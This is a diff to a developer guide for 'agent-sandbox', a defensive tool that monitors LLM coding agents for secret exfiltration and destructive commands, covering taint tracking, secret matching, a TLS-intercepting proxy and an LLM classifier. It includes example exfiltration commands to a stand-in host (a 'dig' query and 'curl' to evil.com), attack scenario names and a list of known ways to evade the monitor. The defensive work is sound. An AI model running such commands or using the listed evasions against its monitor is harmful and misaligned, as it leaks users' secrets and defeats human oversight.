@@ -4,7 +4,8 @@
 
 A security enforcement layer for LLM-powered coding agents. Prevents agents from
 exfiltrating secrets, destroying files, or pivoting to external services. Works by
-combining taint tracking, content matching, anomaly detection, and HTTPS interception.
+combining taint tracking, content matching, anomaly detection, HTTPS interception,
+and optional LLM-based classification.
 
 **Zero external dependencies** for the core runtime. Python 3.11+ stdlib only.
 
@@ -12,7 +13,7 @@ combining taint tracking, content matching, anomaly detection, and HTTPS interce
 
 ```bash
 pip install -e ".[dev]"         # install editable + dev deps
-pytest                          # run all 166 tests (~11s)
+pytest                          # run all 179 tests (~12s)
 pytest tests/test_lsh.py        # run one test file
 pytest -k "test_exfil"          # run tests matching pattern
 ruff check src/ tests/          # lint
@@ -22,37 +23,53 @@ ruff format src/ tests/         # format
 CLI:
 ```bash
 agent-sandbox --project /path/to/project -- python agent.py
-agent-sandbox --project . --no-scan -- bash   # blind mode
+agent-sandbox --project . --no-scan -- bash        # blind mode (no pre-scan)
+agent-sandbox --project . --no-proxy -- bash       # disable MITM proxy
+```
+
+E2E experiment:
+```bash
+python -m agent_sandbox.experiments.e2e_runner
+python -m agent_sandbox.experiments.e2e_runner --with-classifier  # requires anthropic
+python -m agent_sandbox.experiments.simulated_adversary
+python -m agent_sandbox.attacks.run_all
 ```
 
 ## Architecture
 
-Two-phase system: **build time** (scan project, index secrets) and **run time**
-(intercept traffic, enforce policy). Runtime is fast — all expensive work happens
-at scan time.
+`sandbox.py` is the orchestrator. It composes primitives from `core/` — no
+duplication. `core/` holds taint tracking, LSH, anomaly detection, policy, and
+classification. `proxy/` handles HTTPS interception with MCP awareness.
 
 ```
 scan project → ScanManifest → Sandbox(manifest) → start MITM proxy → launch agent
-                                                        │
-                                            intercept every HTTP/HTTPS request
-                                                        │
-                                            taint check → host check → LSH check → anomaly check
-                                                        │
-                                                  ALLOW or 403 DENY
+                                    │                    │
+                          core/taint.TaintTracker   intercept every HTTP/HTTPS request
+                          core/lsh.LSHEngine              │
+                          core/anomaly.AnomalyDetector    ├─ generic: taint → host → LSH → anomaly
+                          core/policy.PolicyEngine        └─ MCP-aware: detect tools/call JSON-RPC
+                                                               extract tool + args, check_exec for shell
+                                                               │
+                                                         ALLOW or 403 DENY
 ```
 
 ### Enforcement layers (checked in order)
 
 1. **Taint tracking** — Has the agent read sensitive files? Monotonic: once tainted,
-   always tainted. (`core/taint.py`, `sandbox.py:TaintState`)
+   always tainted. Per-PID with parent→child inheritance. (`core/taint.py`)
 2. **Host allowlist** — Tainted process + unknown host = always DENY. Allowlisted:
-   github.com, pypi.org, npmjs.org, etc. (`sandbox.py:DEFAULT_ALLOWED_HOSTS`)
+   github.com, pypi.org, npmjs.org, etc. (`core/policy.py:DEFAULT_ALLOWED_HOSTS`)
 3. **LSH content matching** — Detects secrets even after base64/hex/URL encoding.
-   Trigram Jaccard + simhash + minhash, with per-line fallback. (`core/lsh.py`)
+   Three-stage: trigram bloom pre-check → MinHash LSH → combined scoring
+   (SimHash × 0.25 + MinHash × 0.40 + Bloom × 0.35). (`core/lsh.py`)
 4. **Anomaly detection** — Catches evasion: rate bursts (>30 req/host), repeated
    shapes (chunked exfil), accumulated small requests. (`core/anomaly.py`)
 5. **MITM proxy** — Terminates TLS, reads plaintext, passes body through layers
-   1-4. Generates per-host certs signed by our CA. (`proxy/mitm.py`, `proxy/cert.py`)
+   1-4. MCP-aware: detects `tools/call` JSON-RPC in request bodies, runs
+   `check_exec` for shell tools. (`proxy/mitm.py`, `proxy/cert.py`)
+6. **LLM classifier** (optional) — Claude-based risk assessment for turns the
+   regex pre-filter flags as SUSPICIOUS. Two-tier: free regex → paid LLM.
+   Caches judgments for future model distillation. (`core/llm_classifier.py`)
 
 ### Key decision: `Sandbox.check_send(host, body) → (allowed, reason)`
 
@@ -64,11 +81,27 @@ anomaly detected?    → DENY
 else                 → ALLOW
 ```
 
+### Sandbox class delegates to core/
+
+```python
+class Sandbox:
+    """Orchestrates core/ primitives. No duplicate logic."""
+    _tracker: TaintTracker         # core/taint.py
+    lsh: LSHEngine                 # core/lsh.py
+    _anomaly: AnomalyDetector      # core/anomaly.py
+    policy: PolicyEngine           # core/policy.py
+    taint: TaintState              # compatibility wrapper (taint.tainted, taint.taint())
+```
+
+`TaintState` is a thin wrapper around `TaintTracker` that exposes the
+`.tainted` bool and `.taint(source)` method for backward compatibility.
+Under the hood it delegates to `TaintTracker.is_process_tainted(pid)`.
+
 ## Package Layout
 
 ```
 src/agent_sandbox/
-├── sandbox.py              # Sandbox class: taint + LSH + anomaly + policy (main entry)
+├── sandbox.py              # Sandbox class (orchestrator) + CLI entrypoint
 ├── env_scanner.py          # Pre-scan project for secrets/PII/infrastructure
 ├── call_summarizer.py      # Auto-summarize LLM tool calls → timeline + JSONL
 ├── trace_analyzer.py       # Behavioral analysis of LLM reasoning traces
@@ -79,43 +112,33 @@ src/agent_sandbox/
 │   ├── lsh.py              # LSHEngine: trigram + simhash + minhash + variants
 │   ├── anomaly.py          # AnomalyDetector: rate + shape + accumulator
 │   ├── classifier.py       # classify(path, content) → TaintLabel
-│   └── policy.py           # PolicyEngine: combines all signals → Decision
+│   ├── policy.py           # PolicyEngine: combines all signals → Decision
+│   └── llm_classifier.py   # LLMClassifier: Claude-based risk assessment (optional)
 ├── proxy/
 │   ├── cert.py             # CertAuthority: CA generation + per-host signing
-│   ├── mitm.py             # MITMProxy: CONNECT tunnels, TLS termination
+│   ├── mitm.py             # MITMProxy: CONNECT tunnels, TLS, MCP-aware inspection
 │   └── inspector.py        # ProxyInspector: standalone content checker
 ├── attacks/
 │   ├── disruption.py       # 8 disruption scenarios (rm -rf, fork bomb, etc.)
 │   ├── disclosure.py       # 11 disclosure scenarios (exfil vectors)
-│   └── run_all.py          # Run all attacks + report
+│   └── run_all.py          # Run all 19 attacks + report
 └── experiments/
     ├── simulated_adversary.py  # 5 adversary skill levels
-    └── llm_adversarial.py      # LLM-driven red team
+    ├── llm_adversarial.py      # LLM-driven red team scaffolding
+    └── e2e_runner.py           # Full pipeline: scan → attacks → adversary → report
 
 tests/
+├── conftest.py             # Shared fixtures
 ├── test_taint.py           # 12 tests: labels, inheritance, propagation
 ├── test_lsh.py             # 22 tests: trigram, simhash, minhash, variants
 ├── test_integration.py     # 40 tests: disruption, disclosure, classifier, sandbox
 ├── test_proxy_inspector.py # 22 tests: content inspection, all exfil vectors
 ├── test_e2e.py             # 15 tests: strace parser, scanner, pipeline
 ├── test_mitm_e2e.py        # 12 tests: CA certs, real TLS, subprocess proxy
-└── test_call_summarizer.py # 43 tests: intent, classification, timeline, JSONL
+├── test_call_summarizer.py # 43 tests: intent, classification, timeline, JSONL
+├── test_llm_classifier.py  # 11 tests: parse, prompt build, assess (mocked)
+└── test_e2e_runner.py      # 2 tests: full pipeline integration
 ```
-
-## Two Sandbox Implementations
-
-There are two overlapping implementations that should be **merged**:
-
-| | `sandbox.py` (simple) | `core/` (full) |
-|-|----------------------|----------------|
-| Taint | Single boolean `TaintState` | Per-PID `TaintTracker` with Flag enum |
-| LSH | Inline `LSHEngine` (trigram only) | Full `LSHEngine` (trigram + simhash + minhash) |
-| Anomaly | Inline `AnomalyDetector` | Identical `AnomalyDetector` |
-| Policy | Inline in `check_send()` | Separate `PolicyEngine` class |
-
-The `core/` versions are strictly more capable. `sandbox.py` duplicates their logic
-in a simpler form. **Priority merge task**: make `sandbox.py` import from `core/`
-instead of reimplementing.
 
 ## Key Conventions
 
@@ -124,7 +147,10 @@ instead of reimplementing.
 - **Allowlist > blocklist**: unknown hosts blocked for tainted processes
 - **Variants pre-indexed**: base64, hex, URL-encoded versions of each secret are
   indexed at scan time, not checked at runtime
-- **Tests mirror source**: `sandbox.py` → `test_e2e.py`, `core/lsh.py` → `test_lsh.py`
+- **core/ holds primitives, sandbox.py orchestrates**: no logic duplication
+- **MCP interception via MITM proxy**: remote MCP servers are intercepted by the
+  same proxy that handles all HTTPS. No separate MCP proxy needed. Local MCP
+  servers (stdio) are trusted and not intercepted.
 
 ## Style
 
@@ -139,54 +165,14 @@ when a function will do. Catch specific exceptions. Google Python Style Guide.
 
 ## What to Work on Next
 
-### Priority 1: Merge the two implementations
-
-`sandbox.py` has its own `LSHEngine`, `AnomalyDetector`, `TaintState` that duplicate
-`core/lsh.py`, `core/anomaly.py`, `core/taint.py`. Merge them:
-
-1. Make `sandbox.py` import from `core/` instead of defining its own classes
-2. Replace `TaintState` (bool) with `TaintTracker` (per-PID, Flag enum)
-3. Use `core/lsh.py`'s full LSHEngine (simhash + minhash) instead of the
-   trigram-only version in `sandbox.py`
-4. Wire `PolicyEngine` from `core/policy.py` into the sandbox
-5. Keep `sandbox.py` as the high-level API, `core/` as the primitives
-
-### Priority 2: Wire MITM proxy into sandbox CLI
-
-`sandbox.py:main()` launches subprocesses but doesn't start the MITM proxy.
-The proxy exists (`proxy/mitm.py`) and works end-to-end. Wire it in:
-
-1. In `main()`, after scanning, create `CertAuthority` and `MITMProxy`
-2. Start proxy, get `proxy.get_env()` env vars
-3. Add env vars to the subprocess environment
-4. On exit, print proxy stats + call summarizer timeline
-5. Test: `agent-sandbox --project . -- curl https://evil.com` should be blocked
-
-### Priority 3: Add local ML classifier
-
-The `call_summarizer.py` produces JSONL output designed for a downstream classifier.
-Build `core/classifier_ml.py`:
-
-1. Add optional dependency: `onnxruntime`, `transformers`
-2. Use ModernBERT-base (149M, sub-ms on CPU) or DeBERTa-v3-xsmall (22M)
-3. Fine-tune on synthetic data from the 19 attack scenarios
-4. Export to ONNX for fast inference
-5. Integrate as Tier 2: regex pre-filter → ML classifier for SUSPICIOUS verdicts
-
-**Pre-trained option**: ProtectAI's `deberta-v3-base-prompt-injection-v2` on
-HuggingFace — zero-shot baseline for prompt injection detection.
-
-**Production precedent**: Wiz built a secret detector with Llama 3.2-1B + LoRA,
-quantized to INT8 via llama.cpp. 86% precision, 27 tok/s on ARM CPU.
-
-### Priority 4: eBPF migration
+### Priority 1: eBPF migration
 
 Replace strace-based syscall monitoring with eBPF probes for lower overhead:
 - Tetragon for Kubernetes environments (detection + enforcement)
 - Falco for general Linux (detection, flexible rules)
 - Both achieve 100% detection, 0 false positives in benchmarks
 
-### Priority 5: DNS exfiltration detection
+### Priority 2: DNS exfiltration detection
 
 The MITM proxy catches HTTP/HTTPS but not DNS. An agent could exfil via
 `dig AKIA1234.evil.com`. Options:
@@ -194,13 +180,13 @@ The MITM proxy catches HTTP/HTTPS but not DNS. An agent could exfil via
 - Use network namespace + iptables to force DNS through a local resolver
 - Parse DNS queries for high-entropy subdomain labels
 
-### Priority 6: MCP tool call interception
+### Priority 3: LLM classifier dataset generation
 
-Build a JSON-RPC proxy that sits between an agent and MCP servers:
-- Inspect every `tools/call` request (tool name + arguments)
-- Run sandbox checks on arguments
-- Correlate with the agent's reasoning (preamble before tool call)
-- Block or pass through to the real MCP server
+The `LLMClassifier` caches every assessment as a training pair. Next steps:
+1. Run real agent sessions through the sandbox with the classifier enabled
+2. Export JSONL dataset via `classifier.export_dataset()`
+3. Fine-tune a smaller model (ModernBERT-base or DeBERTa-v3) on the data
+4. Replace Claude with the local model for cost-free runtime classification
 
 ### Known Gaps
 
@@ -208,14 +194,15 @@ Build a JSON-RPC proxy that sits between an agent and MCP servers:
 2. **Custom ciphers** (ROT13, XOR, AES) are not detectable by LSH
 3. **Very slow drip** (1 byte/minute over hours) may evade rate + accumulator
 4. **Steganography** (secret in image pixels) is not inspected
-5. **DNS exfil** not intercepted (see Priority 5)
+5. **DNS exfil** not intercepted (see Priority 2)
 6. **Proxy bypass** — agent could clear `HTTPS_PROXY` env var. Mitigation:
    network namespace + iptables to force all traffic through proxy
-7. **sandbox.py duplicates core/** — see Priority 1
+7. **Per-line dilution** — splitting secrets across many small lines can evade
+   the LSH per-line check (1 known escaped attack in the test suite)
 
 ## Testing
 
-Always run `pytest` before committing. All 166 tests must pass. When adding a new
+Always run `pytest` before committing. All 179 tests must pass. When adding a new
 detection strategy, also add an attack scenario in `attacks/` and a test that
 verifies the attack is blocked.
 
@@ -243,7 +230,5 @@ class TestNewFeature:
 - pytest >= 8.0
 - ruff >= 0.4
 
-**Future (optional, for ML classifier):**
-- onnxruntime
-- transformers (or sentence-transformers)
-- BAAI/bge-small-en-v1.5 or ModernBERT-base
+**Optional (for LLM classifier):**
+- anthropic >= 0.40 — `pip install agent-sandbox[llm]`
